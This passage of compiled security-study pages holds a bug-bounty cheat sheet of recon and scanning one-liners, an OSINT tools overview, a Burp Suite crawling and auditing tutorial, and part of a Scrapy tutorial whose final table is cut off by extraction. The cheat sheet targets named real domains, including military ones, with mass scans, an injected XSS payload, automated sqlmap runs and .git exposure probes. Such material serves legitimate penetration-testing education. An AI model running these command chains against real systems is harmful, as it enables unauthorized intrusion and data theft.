apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | 
anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl" 
Chaos to Gospider 
• 
Explained command 
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-
forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) 
AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @ 
Checking invalid certificate 
• 
Real script 
• 
Script King 
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk 
'/domain/{print $5}' | httpx 
Using shodan & Nuclei 
• 
Explained command 
Shodan is a search engine that lets the user find specific types of computers connected to the 
internet, AWK Cuts the text and prints the third column. httpx is a fast and multi-purpose HTTP 
using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates 
offering massive extensibility and ease of use, You need to download the nuclei templates. 
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-
templates/ 
Open Redirect test using gf. 
[[ PAGE 109 ]]
• 
Explained command 
echo is a command that outputs the strings it is being passed as arguments. What to 
Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback 
Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. 
GF? A wrapper around grep to avoid typing common patterns and anew Append lines from 
stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, 
removes duplicates. 
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew 
Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using 
shodan and jaeles". 
• 
Explained command 
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s 
/jaeles-signatures/ -u @ 
Using Chaos to jaeles "How did I find a critical today?. 
• 
Explained command 
To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output 
from chaos domain.com we need it to be treated as http or https, so we use httpx to get the 
results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output 
treated for import into jaeles, where he will scan using his templates. 
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @  
Using shodan to jaeles 
• 
Explained command 
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print 
$1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 
scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts  
Search to files using assetfinder and ffuf 
• 
Explained command 
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt 
-u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"' 
HTTPX using new mode location and injection XSS using qsreplace. 
• 
Explained command 
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo 
'(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -
Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "' 
Grap internal juicy paths and do requests to them. 
• 
Explained command 
[[ PAGE 110 ]]
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' 
| grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | 
httpx -silent -content-length' 
Download to list bounty targets We inject using the sed .git/HEAD command at the end of 
each url. 
• 
Explained command 
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-
data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -
content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -
title | anew 
Using to findomain to SQLINJECTION. 
• 
Explained command 
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; 
sqlmap -m sqli --batch --random-agent --level 1 
Jaeles scan to bugbounty targets. 
• 
Explained command 
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-
data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs 
-I@ jaeles scan -s /jaeles-signatures/ -u @ 
JLDC domain search subdomain, using rush and jaeles. 
• 
Explained command 
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-
]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-
signatures/ -u {}' 
Chaos to search subdomains check cloudflareip scan port. 
• 
Explained command 
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -
verify | httpx -title -silent 
Search JS to domains file. 
• 
Explained command 
cat FILE TO TARGET | httpx -silent | subjs | anew 
Search JS using assetfinder, rush and hakrawler. 
• 
Explained command 
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -
silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal" 
Search to CORS using assetfinder and rush 
[[ PAGE 111 ]]
• 
Explained command 
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H 
"Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - 
{}\e[m"' 
Search to js using hakrawler and rush & unew 
• 
Explained command 
cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | 
unew hakrawlerHttpx' 
XARGS to dirsearch brute force. 
• 
Explained command 
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e 
php,html,json,aspx,sql,asp,js'  
Assetfinder to run massdns. 
• 
Explained command 
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; 
cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent 
Extract path to js 
• 
Explained command 
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u  
Find subdomains and Secrets with jsubfinder 
• 
Explained command 
cat subdomsains.txt | httpx --silent | jsubfinder search -s 
Search domains to Range-IPS. 
• 
Explained command 
cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | 
sed -r 's/.$//g' | httpx -silent -timeout 25 | anew  
Search new's domains using dnsgen. 
• 
Explained command 
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain 
List ips, domain extract, using amass + wordlist 
• 
Explained command 
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk 
'{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | 
sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq 
[[ PAGE 112 ]]
'.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' 
dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-
wordlist.txt | sort -u > hosts-all.txt 
Search domains using amass and search vul to nuclei. 
• 
Explained command 
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | 
nuclei -t PATH -o result -timeout 30  
Verify to cert using openssl. 
• 
Explained command 
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{ 
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <( 
    openssl x509 -noout -text -in <( 
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \ 
            -connect hackerone.com:443 ) ) 
Search domains using openssl to cert. 
• 
Explained command 
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 
's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew  
Search to Hackers. 
• 
Censys 
• 
Spyce 
• 
Shodan 
• 
Viz Grey 
• 
Zoomeye 
• 
Onyphe 
• 
Wigle 
• 
Intelx 
• 
Fofa 
• 
Hunter 
• 
Zorexeye 
• 
Pulsedive 
• 
Netograph 
[[ PAGE 113 ]]
• 
Vigilante 
• 
Pipl 
• 
Abuse 
• 
Cert-sh 
• 
Maltiverse 
• 
Insecam 
• 
Anubis 
• 
Dns Dumpster 
• 
PhoneBook 
• 
Inquest 
• 
Scylla 
https://github.com/KingOfBugbounty/KingOfBugBountyTips/blob/master/Readme.md 
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html 
OSINT (Open Source Intelligence) 
Introduction 
In this article, we will be discussing various OSINT tools that are available in the market. When 
we search the internet there are multiple pages of results that are presented. We just have a 
look at the first page and research and if we do not get what we are expecting, we stop right? 
But have you ever wondered what lies in those hundreds of pages of result? "Information”! 
Let's get this free information using various tools. Tools are important but not knowing the 
usage of a tool will leave the user helpless. Before digging into the tools let's have a fair idea of 
what OSINT is and what can be achieved out of it. 
What is Open Source Intelligence? 
OSINT stands for open source intelligence. The Internet is an ocean of data which is an 
advantage as well as a disadvantage. 
Pros are that the internet is free and accessible to everyone unless restricted by an 
organization or law. The Internet has all the information readily available for anyone to access. 
Cons are that the information is available that can be misused by someone with a malicious 
intent. Collection and correlation of information using these tools are referred to as open 
source intelligence. Information can be in various forms like audio, video, image, text, file etc. 
Below is the bird's eye view of the data categories available on the internet: 
1. Social media websites like Twitter, Facebook etc. hold a lot of user data. 
2. Public facing web servers: Websites that hold information about various users and 
organizations. 
3. Newsletters and articles. 
[[ PAGE 114 ]]
4. Code repositories: Software and code repositories like Codechef, Github hold a lot of 
information but we only see what we are searching for. 
Why do we need tools? 
Getting to know that the information is available is one thing. Collection of the information is 
second and making an analysis or intelligence out of them is the third. The information can be 
gathered manually as well but that will take the time that can instead be used in the later 
stages. Tools can help us gather the data from hundreds of sites in minutes and thus easing the 
collection phase. Let us say that the task is to identify whether a username is present and if so, 
on which all social media websites. One way is to log in to all the social media websites (I bet 
you don't know all of them!) and then testing the username in that. Another way is to use an 
open source tool that is connected to various websites more than what we can remember and 
checks the usernames presence on all the websites at once. This is done just in seconds. Run 
multiple tools to gather all target related information that can be correlated and used later. 
You may also like:  Fundamentals of Website Security for Online Retailers 
OSINT Tools 
1. Maltego 
 
Maltego is developed by Paterva and is used by security professionals and forensic 
investigators for collecting and analyzing open source intelligence. It can easily collect 
Information from various sources and use various transforms to generate graphical results. The 
transforms are inbuilt and can also be customized based on the requirement. Maltego is 
written in Java and comes pre-packaged in Kali Linux. To use Maltego, user registration is 
required, the registration is free. Once registered users can use this tool to create the digital 
footprint of the target on the internet. 
2. Shodan 
[[ PAGE 115 ]]
 
Google is the search engine for all but shodan is the search engine for hackers.  Instead of 
presenting the result like other search engines it will show the result that will make more 
sense to a security professional. As a certified information security professional one of the 
important entity is digital asset and network. Shodan provides you a lot of information about 
the assets that have been connected to the network. The devices can vary from computers, 
laptops, webcams, traffic signals, and various IOT devices. This can help security analysts to 
identify the target and test it for various vulnerabilities, default settings or passwords, 
available ports, banners, and services etc. 
You may also like:  Brute Force Attacks: Prominent Tools to Tackle Such Attacks 
3. Google Dorks 
Google is one of the most commonly used search engine when it comes to finding stuff on the 
internet. For a single search, the results can be of various hundred pages sorted in order of 
relevance. The results vary from ads, websites, social media posts, images etc. Google Dorks 
can help a user to target the search or index the results in a better and more efficient way. Let 
us say that the user wants to search for the word usernames but only requires the results with 
PDF files and not websites. This is done as below: 
 
[[ PAGE 116 ]]
<Filetype: searches for a particular string in a pdf file> 
Some of the other indexing options are: 
• 
Inurl: search for a string in URL of the page. 
• 
Intitle: To search the title for a keyword. 
• 
Ext: To search for a particular extension. 
• 
Intext: Search for a particular text in a page. 
Sometimes it is also referred to as Google hacking. 
4. The Harvester 
 
A harvester is an excellent tool for getting email and domain related information. This one is 
pre-bundled in Kali and can be very useful in fetching information. Below is an example of the 
output when we try to search for emails for Microsoft in PGP server. You can explore more as 
per requirement.  
E.g the harvester –d Microsoft.com –b pgp 
[[ PAGE 117 ]]
 
5. Metagoofil 
 
Metagoofil is written by Christian Martorella and is a command line tool that is used to gather 
metadata of public documents.  The tool is pre-bundled in Kali Linux and has a lot of features 
searching for the document type on the target, local download, extraction of metadata and 
[[ PAGE 118 ]]
reporting the results. For example: Users can scan for a particular kind of documents on a 
particular domain. Metagoofil –d nmap.org –t pdf. 
6. Recon-ng 
 
Recon-ng is a great tool for target information collection. This is also pre-bundled in Kali. The 
power of this tool lies in the modular approach. For those who have used Metasploit will know 
the power of modular tools.  Different modules can be used on the target to extract 
information as per need. Just add the domains in the workspace and use the modules. For 
starters, here is a sample of the tool helping you. 
[[ PAGE 119 ]]
 
You may also like:  Top 15 Prominent Wireless Hacking Tools to watch out for in 2018 
7. Check Usernames 
 
[[ PAGE 120 ]]
Social networking websites hold a lot of information but it will be really boring and time taking 
task if you need to check whether a particular username is present on any social media 
website. To get such information there is a website www.checkusernames.com. It will search 
for the presence of a particular username on more than 150 websites. The users can check for 
the presence of a target on a particular website so as to make the attack more targeted. 
A more advanced version of the website is https://knowem.com which has a more wide 
database of more than 500 websites along with a few more services? 
8. TinEye 
 
Tineye is used to perform an image related search on the web. It has various products like 
tineye alert system, color search API, mobile engine etc. You can search if an image has been 
available online and where that image has appeared. Tineye uses neural networks, machine 
learning, and pattern recognition to get the results. It uses image matching, watermark 
identification, signature matching and various other parameters to match the image rather 
than keyword matching. The website offers API extensions and browser extensions as well. 
You can simply visit the image and right click on it to select search on tineye. 
Link: https://www.tineye.com 
9. Searchcode 
[[ PAGE 121 ]]
 
Searching for text is easy as compared to searching for a code snippet. Try searching for a code 
sample on google and you will be prompted with no results or irrelevant results. Search code 
offers you a feature to search for a line of code which could have been present in various code 
sharing websites like Github etc. Users can search for functions or methods, variables, 
operations, security flaws and anything that can constitute a code segment. Users can search 
for strings as simple as "a++" too complex methods. The search results can be further filtered 
basis a particular repository or language. Do consider a few things before you hit search. 
10. Recorded Future 
 
Recorded Future is an AI-based solution to trend prediction and big data analysis. It uses 
various AI algorithms and both structured and unstructured data to predict the future. The 
users can get past trends and future trends basis OSINT data. 
https://www.greycampus.com/blog/information-security/top-open-source-intelligence-tools 
https://www.offensiveosint.io/  
Crawling and Spidering 
Burp Suite for Pentester: Web Scanner & Crawler 
December 18, 2020 By Raj Chandel 
You might be using a number of different tools in order to test a web-application, majorly to 
detect the hidden web-pages and directories or to get a rough idea about where the low-
hanging fruits or the major vulnerabilities are. 
[[ PAGE 122 ]]
So today, in this article, we’ll discuss how you can identify the hidden web-pages or determine 
the existing vulnerabilities in the web application, all with one of the best intercepting 
tool “Burpsuite”. 
Table of Content 
• 
The Burp’s Crawler 
• 
What is Crawler? 
• 
Crawl with default configurations 
• 
Customizing the Crawler 
• 
Vulnerability Scanning over BurpSuite 
• 
Auditing with default configurations. 
• 
Defining Audit options. 
• 
Crawling & Scanning with an advanced scenario 
• 
Deleting the defined Tasks 
The Burp’s Crawler 
What is Crawler? 
The term web-crawler or web-spider is the most common and is been used a number of times 
while testing a web-application. So, what this crawler is ?? 
Carrying with its name we can depict that a crawler surveys a specific region slowly and deeply 
and then drops down the output with a defined format. 
So is the Burp’s Crawler the same thing ?? 
According to port swigger “The crawl phase involves navigating around the application, 
following links, submitting forms, and logging in, to catalog the content of the application and 
the navigational paths within it.” 
In simpler words, we can say that the burp crawler programmatically moves within the entire 
web-application, follows the redirecting URL’s, logs inside the login portals and then adds them 
all in a tree-like structure over in the Site Map view in the Target tab. 
However, this crawler functions as similar to as the the “Dirb” or the “DirBuster” tools – the 
web content scanners, which brute-force the web-server such in order to dump the visited, 
non-visited, and hidden URLs of the web-application. 
Earlier over in the previous versions of burpsuite say “1.7”, we got this crawler termed 
as “Spider”. So why this happened, what new features did the burp crawler carries that it made 
the spider vanishes off ?? 
Let’s dig it out !! 
Crawl with default configurations !! 
If you’re familiar with the spider feature, then you might be aware, that, the spider holds up a 
specific tab within the burpsuite’s panel. But with the enhancements, the burp’s crawler 
[[ PAGE 123 ]]
comes pre-defined within the dashboard section. However, it thus helps us to monitor and 
control the burp’s automated activities in a single place. 
So, in order to initiate with the crawler, let’s turn ON our burpsuite and redirect to the 
Dashboard section there. 
 
As soon as we land at the dashboard panel, we can see the number of subsection specified. 
Let’s explore them in details : 
1. Tasks – The “Tasks” section carries the summary of all the running crawls and scans, 
whether they are user-defined or the automated ones. Here, we can pause and 
resume the individual tasks, or all tasks together, and even we can view the detailed 
versions of a specific crawl or audit too. 
2. Event log – The Event log feature generates all the events that the burpsuite follows 
like if the proxy starts up the event will be generated for it, or a specific section is not 
working properly, then an event log with the will be generated. 
1. Issue Activity – This section drops out the common vulnerabilities within the 
application that the burpsuite scans up and further we can segregate them all by 
applying the defined filters according to their severity and destructiveness. 
1. Advisory – This is one of the most important section of the burp’s dashboard as it 
demonstrates the selected vulnerability in the expanded form such by defining the 
payload with a Request & Response, mentioning the cause of its existence, defining 
the mitigation steps and dropping the reference and the CVSS Scores for our review. 
Thereby, to dig web-application we need to hit the “New Scan” button placed at the top of 
the Tasks section. 
[[ PAGE 124 ]]
 
As soon as we do so, we’ll be redirected to a new popped-up window stating “New Scan”. 
There we’ll be welcomed with two options – 
• 
Crawl & Audit 
• 
Crawl 
However, for this section, we’ll make it to “Crawl” only. And the other one, we’ll discuss later 
in this article. 
As we’re heading with the default configurations thus we’ll simply type the testing URL i.e. 
“http://testphp.vulnweb.com/” and will hit the “OK” button. 
[[ PAGE 125 ]]
 
As we do so, the window will get disappeared and over in the dashboard we’ll get our new task 
aligned as “Crawl of test.vulnweb.com”, and in the event log, we can see that we got the 
event “Crawl started”. 
[[ PAGE 126 ]]
 
Within a few minutes, the crawling task will get finished up and we’ll get the notification 
there. But where’s the result ?? 
As defined earlier the crawler, dumps the result in a tree-like format in the Site Map 
view in  the Target tab, let’s move there. 
[[ PAGE 127 ]]
 
Great !! We got what we desire for. Over in the right panel we’re having about almost every 
URL of the webpage, along with that, it carries up the HTTP methods and a parameter 
section that defines which URL requires a Params value within it. 
A number of major vulnerabilities exist due to the unsanitized input fields thereby with this 
dumped data we can simply segregate the URL’s that contains the Input values which thus 
can be further tested on. And for this simply double click the “Params” field. 
 
However, if we want to check the pages or a specific directory, we can simply navigate the left 
side and select our desired option there. 
[[ PAGE 128 ]]
 
Customizing the Crawler 
What, if some specific webpages are Out of Scope ?? Or the website needs some specific 
credentials to surf the restricted web-pages? 
Therefore, in such cases, we need to configure our crawler, such that, it could work as we want 
it to. So, to do this, let’s get back to the dashboard and select the “New Scan” option again. 
But for this time we won’t hit “OK” after setting the URL. 
Configuring Out of Scope URL’s 
Below at the protocol setting, there is an option for the Detailed Scope Configuration, where 
we’ll simply navigate to the “Excluded URL prefixes” and will enter the Out of Scope 
URL i.e. http://testphp.vulnweb.com/signup.php 
[[ PAGE 129 ]]
 
For further customization, we’ll thus move to the Scan Configuration option. And there we’ll 
hit the “New ” button to set up a new crawler. 
 
As soon as we do so, we’ll thus get another window open with the configuration options. 
Let’s keep the configuration name as the default, however, you can change if you wish so. 
Further, the Crawl optimization option segregates within the “Fastest to the 
Deepest”, thereby we’ll thus change it according to our requirement. 
[[ PAGE 130 ]]
 
Crawl Limit is considered to be an important factor as it determines the time required and the 
depth to crawl an application. Thereby we’ll set the maximum crawl limit to 50 minutes and 
the Maximum unique locations discovered to 5000. 
 
There are applications that carry user registration or login portals, thus checking both the 
options will thus guide the burp’s crawler to self-register with some random values if 
encounters up with a signup portal and even use wrong credentials at the login portals such in 
order to determine the website’s behaviour. 
 
Now with all these configurations as soon as we hit the “Save” button we thus get our crawler 
listed at the New scan dashboard. 
[[ PAGE 131 ]]
 
What, if the crawler encounters with the restricted pages? Or an admin portal? Thereby, for 
such situations, let’s feed up some default credentials so that the crawler can use them !! 
Navigate to the “Application login” section and click on “New”. 
 
Over in the pop-up box, enter the desired credentials & hit the “OK” button. 
 
Along with all these things, we’re having one more option within the “New Scan 
dashboard”, i.e. “Resource Pool”. 
A resource pool is basically a section defined for the concurrent requests or in simpler terms, 
we can say about how many requests the crawler will send to the application in one go, and 
what would be the time gap between the two requests. 
[[ PAGE 132 ]]
Therefore, if you’re testing a fragile application which could get down with an excessive 
number of request, thus then you can configure it accordingly, but as we’re testing the demo 
application thereby we’ll set them to default. 
 
Now as we hit the “OK” button, our crawler will start which thus could be monitored at the 
dashboard. 
 
[[ PAGE 133 ]]
Now, let’s wait for it to get END !! As we navigate to the Target tab we’ll thus get our output 
listed, and there we can notice that the signup page is not mentioned, which states that our 
configuration worked properly. 
  
Vulnerability Scanning Over Burpsuite 
Rather being an incepting tool, burpsuite acts as a vulnerability scanner too. Thereby, it scans 
the applications with a name as “Audit”. There are a number of vulnerability scanners over the 
web and burpsuite is one of them, as it is designed to be used by the security testers, and to fit 
in closely with the existing techniques and methodologies for performing manual and semi-
automated penetration tests of web applications. 
So let’s dig the “testphp.vulnweb” vulnerable application and check out what major 
vulnerabilities it carries within. 
Auditing with the default configuration 
As we’ve already crawled the application thus it would be simpler to audit it, however, to 
launch a scanner all we need is a URL, whether we get it by incepting the request, or through 
the target tab. 
From the screenshot, you can perceive that we’ve sent the base URL by doing a right-click and 
opting the “Scan”. 
[[ PAGE 134 ]]
 
As soon as we do so, we’ll thus be redirected back to the New Scan’s Dashboard. But wait !! 
This time we’re having one more option i.e. “Audit Selected items”,  as soon as we select it 
we’ll thus get all the URL’s within the Item to Scan box (This happens because we’ve opted the 
base request). 
As we’re dealing with the default auditing, we’ll thus simply hit the “OK” button there. 
 
And now I guess you know where we need to go. Yes !! The Dashboard tab. 
This time not only the Tasks section and the Event log is changed but we can see the variations 
in the Issue activity and the advisory sections too. 
[[ PAGE 135 ]]
 
From the above image, we can see that within a few minutes our scanner has sent about 
17000 requests to the web-application and even dumped a number of vulnerabilities according 
to their severity level. 
What if we want to see the detailed version ?? 
In order to do so, simply click on the View Details section placed at the bottom of the defined 
task, and will thus get redirected to a new window will all the refined details within it. 
 
Cool !! Let’s check the Audited Items. 
And as we hit the Audit Items tab, we’ll thus get landed up to the detailed version of the 
audited sections, where we’ll get the statues, Active & Passive phases, Requests per URLs and 
many more. 
[[ PAGE 136 ]]
 
Further, we can even check the in-detailed Issues that have been found in the web-application. 
 
Although we can even filter them according to their defined severity levels. 
 
Not only these things, over in the target tab, something is waiting for us i.e. the Issues and the 
Advisory are also mentioned there, but if we look at the defied tree at the left panel we can 
see some colourful dots majorly red and grey indicating that these URL’s are having high and 
informative existing vulnerabilities respectively. 
[[ PAGE 137 ]]
 
However, from the below image, with the Advisory option of SQL Injection, there is a specific 
panel for Request & Response, let’s check them and determine how the scanner confirms that 
there is an SQL Injection existing. 
 
As we navigate to the 3rd Request, we got an SQL time-based query injected in 
the “artist=” field. 
And as we shared this request with the browser, we got the delay of about 20 seconds, which 
confirms that the vulnerabilities dumped with the scanner are triggerable. 
[[ PAGE 138 ]]
 
You might be wondering like okay I got the vulnerability, but I’m not aware of it – what more 
could I get with or how could I chain it to make a crucial hit. 
Therefore, in order to solve this issue, we got an Issue definition section, where we can simply 
go through with the defined or captured vulnerability. 
 
Defining Audit Configurations 
Similar to the Crawling option, we can simply configure this Audit too, by getting back to 
the “New Scan” dashboard with a right-click on the defined URL & hitting Scan. 
[[ PAGE 139 ]]
 
Here, in the above image, if we scroll down, we’ll thus get the same option to set the Out Of 
Scope URL as was in the Crawl section. 
Now, moving further with the scan configurations, hit the “New” button as we did earlier. 
 
Setting the configuration name to default and manipulating the audit accuracy to normal, you 
can define it according to your need. 
[[ PAGE 140 ]]
 
Now comes to the most important section to define the Issues reported by selecting the “Scan 
Type”. Here in order to complete the scan faster, I’m simply taking the Light active 
scan option, but you can opt any of the following – 
• 
Passive – These issues are detected simply by inspecting the application’s behaviour of 
requests and responses. 
• 
Light active – Here this detects issues by making a small number of benign additional 
requests. 
• 
Medium active – These are issues that can be detected by making requests that the 
application might reasonably view as malicious. 
• 
Intrusive active – These issues are detected by making requests that carry a higher risk 
of damaging the application or its data. For example, SQL injection. 
• 
JavaScript analysis – These are issues that can be detected by analyzing the JavaScript 
that the application executes on the client-side. 
[[ PAGE 141 ]]
 
You might be aware of the concept of insertion points, as they are the most important sections 
to the vulnerability to get hit. They are basically locations within the requests where the 
payloads are injected. However, the burp’s scanner even audits the insertion points too, and 
thus could also be manipulated in this phase. 
 
Now as we’re done with the configuration and we hit the “Save” button, our customized audit 
is thus gets listed up in the New Scan’s dashboard. 
[[ PAGE 142 ]]
 
However, the option of Application login is disabled in this section as there is no specific need 
to log in an application just for vulnerability testing. 
Therefore, now we know what’s next, i.e. hitting the OK button and moving to the dashboard. 
And as soon as we reach there, we’ll get the result according to our configuration with 
about 2700 request. 
But this time, the major issue is only “1” 
 
Now, if we move back to the Target tab and select any request from the left panel and do a 
right-click over there, we’ll get 2 options rather than “1”, i.e. the last customization we 
configure will thus get into this field and if we share any request within it, it will start auditing 
accordingly. 
 
[[ PAGE 143 ]]
Thereby, we’ll opt the Open scan launcher again to check the other features too. As we head 
back, we’re welcomed with our previous customized audit, but at the bottom, there is 
a “Select from library” option, click there and check what it offers. 
 
So, wasn’t it a bit confusing to configure the audit by manipulating every option it has ?? 
Thereby, to get rid of this, burpsuite offer one more great feature to opt a built-in Audit check, 
where we simply need to select any and continue. 
 
And as we select one, we’ll thus get our option listed back into the New Scan dashboard. 
[[ PAGE 144 ]]
 
Hit “OK” and check the result in the dashboard !! Further, now if we navigate to Target 
tab and do a right-click on any request we’ll thus get 3 option rather than 2. 
 
Crawling & Scanning with an Advanced Scenario 
Up till now, we’ve used the scanner and the crawler individually, but what if we want to do 
both the things together. Thereby in order to solve this problem too, the burpsuite creators 
gives us an End-to-End scan opportunity, where our burpsuite will – 
1. First Crawl the application and discover the contents and the functionalities within it. 
2. Further, it will start auditing it for the vulnerabilities. 
Thereby, to do all this, all it needs a “URL”. 
Let’s check how we can do it. 
Back on the dashboard, select “New Scan”, and now this time opt “Crawl & Audit”, further 
mention the URL within it. 
[[ PAGE 145 ]]
 
Great !! Now let’s check the Scan Configuration options, as we move there and when we click 
on the “New” button, rather than redirecting us to the customization menu it asks us about 
where to go, for crawl optimization or audit configuration. 
However, all the internal options are the same. 
 
Deleting the Defined Tasks 
Rather not only knowing how to start or configure the things up, but we should also be aware 
of how to end them all. Thereby let’s click on the Dustbin icon defined up as a Task option, in 
order to delete our completed or incompleted tasks. 
[[ PAGE 146 ]]
 
And as we do so, we got the confirmation pop-up as 
 
Author: Geet Madan is a Certified Ethical Hacker 
https://www.hackingarticles.in/burp-suite-for-pentester-web-scanner-crawler/  
Making Web Crawlers Using Scrapy for Python 
Develop web crawlers with Scrapy, a powerful framework for extracting, processing, and 
storing web data. 
If you would like an overview of web scraping in Python, take DataCamp's Web Scraping with 
Python course. 
In this tutorial, you will learn how to use Scrapy which is a Python framework using which you 
can handle large amounts of data! You will learn Scrapy by building a web scraper 
for AliExpress.com which is an e-commerce website. Let's get scrapping! 
• 
Scrapy Overview 
• 
Scrapy Vs. BeautifulSoup 
• 
Scrapy Installation 
• 
Scrapy Shell 
[[ PAGE 147 ]]
• 
Creating a project and Creating a custom spider 
A basic HTML and CSS knowledge will help you understand this tutorial with greater ease and 
speed. Read this article for a fresher on HTML and CSS. 
Scrapy Overview 
Source 
Web scraping has become an effective way of extracting information from the web for 
decision making and analysis. It has become an essential part of the data science toolkit. Data 
scientists should know how to gather data from web pages and store that data in different 
formats for further analysis. 
Any web page you see on the internet can be crawled for information and anything visible on 
a web page can be extracted [2]. Every web page has its own structure and web elements that 
because of which you need to write your web crawlers/spiders according to the web page 
being extracted. 
Scrapy provides a powerful framework for extracting the data, processing it and then save it. 
Scrapy uses spiders, which are self-contained crawlers that are given a set of instructions [1]. 
In Scrapy it is easier to build and scale large crawling projects by allowing developers to reuse 
their code. 
Scrapy Vs. BeautifulSoup 
In this section, you will have an overview of one of the most popularly used web scraping tool 
called BeautifulSoup and its comparison to Scrapy. 
Scrapy is a Python framework for web scraping that provides a complete package for 
developers without worrying about maintaining code. 
Beautiful Soup is also widely used for web scraping. It is a Python package for parsing HTML 
and XML documents and extract data from them. It is available for Python 2.6+ and Python 3. 
Here are some differences between them in a nutshell: 
[[ PAGE 148 ]]
Scrapy 
BeautifulSoup 
Functionality 
--- 
Scrapy is the complete package for downloading web pages, processing them and save 
it in files and databases 
BeautifulSoup is ba
requires additional
open URLs and sto
Learning Curve 
--- 
Scrapy is a powerhouse for web scraping and offers a lot of ways to scrape a web page. 
It requires more time to learn and understand how Scrapy works but once learned, 
eases the process of making web crawlers and running them from just one line of 
command. Becoming an expert in Scrapy might take some practice and time to learn all 
functionalities. 
BeautifulSoup is re
newbies in program
done in no time 
Speed and Load 
--- 
Scrapy can get big jobs done very easily. It can crawl a group of URLs in no more than a 
minute depending on the size of the group and does it very smoothly as it 
uses Twister which works asynchronously (non-blocking) for concurrency. 
BeautifulSoup is us
efficiency. It is slow
use multiprocessin
Extending functionality 
--- 
Scrapy provides Item pipelines that allow you to write functions in your spider that can 
process your data such as validating data, removing data and saving data to a database. 
It provides spider Contracts to test your spiders and allows you to create generic 
and deep crawlers as well. It allows you to manage a lot of variables such as retries, 
redirection and so on. 
If the project does 
BeautifulSoup is go
much customizatio
and data pipelines,
